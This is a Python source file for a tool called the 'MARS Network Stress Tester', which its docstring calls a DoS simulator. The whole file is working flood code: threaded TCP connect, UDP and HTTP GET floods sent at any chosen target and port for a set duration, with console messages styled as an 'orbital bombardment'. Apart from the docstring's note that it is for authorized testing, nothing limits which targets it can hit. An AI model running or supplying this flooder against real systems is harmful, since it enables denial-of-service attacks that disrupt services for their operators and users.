import threading
import socket
import time
import random
import sys
from rich.console import Console
from rich.progress import Progress

console = Console()

class StressTester:
    """
    MARS Network Stress Tester (DoS Simulator).
    For authorized resistance testing only.
    """
    
    def __init__(self):
        self.running = False
        self.packet_count = 0
    
    def start(self, target, port, mode="TCP", threads=10, duration=60):
        """Start the stress test."""
        self.running = True
        self.packet_count = 0
        
        console.print(f"\n[bold red]ðŸ”¥ INITIATING ORBITAL BOMBARDMENT ðŸ”¥[/bold red]")
        console.print(f"[yellow]Target:[/yellow] {target}:{port}")
        console.print(f"[yellow]Mode:[/yellow] {mode}")
        console.print(f"[yellow]Threads:[/yellow] {threads}")
        console.print(f"[yellow]Duration:[/yellow] {duration}s\n")
        
        thread_list = []
        
        # Start threads
        for _ in range(threads):
            if mode.upper() == "TCP":
                t = threading.Thread(target=self._tcp_flood, args=(target, int(port)))
            elif mode.upper() == "UDP":
                t = threading.Thread(target=self._udp_flood, args=(target, int(port)))
            elif mode.upper() == "HTTP":
                 t = threading.Thread(target=self._http_flood, args=(target, int(port)))
            else:
                console.print("[red]Unknown mode[/red]")
                return
                
            t.daemon = True
            t.start()
            thread_list.append(t)
            
        # Monitor progress
        try:
            with Progress() as progress:
                task = progress.add_task("[red]Bombarding...", total=duration)
                
                start_time = time.time()
                while time.time() - start_time < duration:
                    time.sleep(1)
                    progress.update(task, advance=1)
                    
        except KeyboardInterrupt:
            console.print("\n[yellow]Attack paused by user.[/yellow]")
        
        self.running = False
        console.print(f"\n[bold green]âœ“ Attack Complete.[/bold green]")
        console.print(f"[dim]Total Packets Sent: ~{self.packet_count}[/dim]\n")

    def _tcp_flood(self, target, port):
        """TCP Connect Flood."""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.send(random._urandom(1024))
                self.packet_count += 1
                s.close()
            except:
                pass

    def _udp_flood(self, target, port):
        """UDP Flood."""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(1024)
                s.sendto(payload, (target, port))
                self.packet_count += 1
            except:
                pass

    def _http_flood(self, target, port):
        """HTTP GET Flood."""
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                request = f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\nHost: {target}\r\n\r\n"
                s.send(request.encode())
                self.packet_count += 1
                s.close()
            except:
                pass
